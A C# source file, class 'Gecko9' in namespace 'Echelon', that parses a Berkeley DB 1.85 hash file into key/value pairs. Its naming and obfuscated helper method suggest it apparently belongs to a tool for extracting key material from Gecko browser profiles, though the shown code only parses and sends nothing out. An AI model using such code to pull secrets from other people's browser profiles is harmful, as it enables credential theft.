using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Echelon
{
	public class Gecko9
	{
        public Gecko9(string FileName)
		{
			var list = new List<byte>();
			Keys = new List<KeyValuePair<string, string>>();
			using (var binaryReader = new BinaryReader(File.OpenRead(FileName)))
			{
				var i = 0;
				for (var num = (int)binaryReader.BaseStream.Length; i < num; i++) list.Add(binaryReader.ReadByte());
            }
			var value = BitConverter.ToString(Txtnhfrn(list.ToArray(), 0, 4, false)).Replace("-", "");
			var text = BitConverter.ToString(Txtnhfrn(list.ToArray(), 4, 4, false)).Replace("-", "");
			var num2 = BitConverter.ToInt32(Txtnhfrn(list.ToArray(), 12, 4, true), 0);
			if (!string.IsNullOrEmpty(value))
			{
				Version = "Berkelet DB";
				if (text.Equals("00000002")) Version += " 1.85 (Hash, version 2, native byte-order)";
                var num3 = int.Parse(BitConverter.ToString(Txtnhfrn(list.ToArray(), 56, 4, false)).Replace("-", ""));
				var num4 = 1;
				while (Keys.Count < num3)
				{
					var array = new string[(num3 - Keys.Count) * 2];
					for (var j = 0; j < (num3 - Keys.Count) * 2; j++) array[j] = BitConverter.ToString(Txtnhfrn(list.ToArray(), num2 * num4 + 2 + j * 2, 2, true)).Replace("-", "");
                    Array.Sort(array);
					for (var k = 0; k < array.Length; k += 2)
					{
						var num5 = Convert.ToInt32(array[k], 16) + num2 * num4;
						var num6 = Convert.ToInt32(array[k + 1], 16) + num2 * num4;
						var num7 = k + 2 >= array.Length ? num2 + num2 * num4 : Convert.ToInt32(array[k + 2], 16) + num2 * num4;
						var @string = Encoding.ASCII.GetString(Txtnhfrn(list.ToArray(), num6, num7 - num6, false));
						var value2 = BitConverter.ToString(Txtnhfrn(list.ToArray(), num5, num6 - num5, false));
						if (!string.IsNullOrEmpty(@string)) Keys.Add(new KeyValuePair<string, string>(@string, value2));
                    }
					num4++;
				}
			}
			else
			{
				Version = "Unknow database format";
			}
		}

        public string Version
		{
			get;
			set;
		}

        public List<KeyValuePair<string, string>> Keys
		{
			get;
		}

        private byte[] Txtnhfrn(byte[] source, int start, int length, bool littleEndian)
		{
			var array = new byte[length];
			var num = 0;
			for (var i = start; i < start + length; i++)
			{
				array[num] = source[i];
				num++;
			}
			if (littleEndian) Array.Reverse(array);
            return array;
		}
    }
}
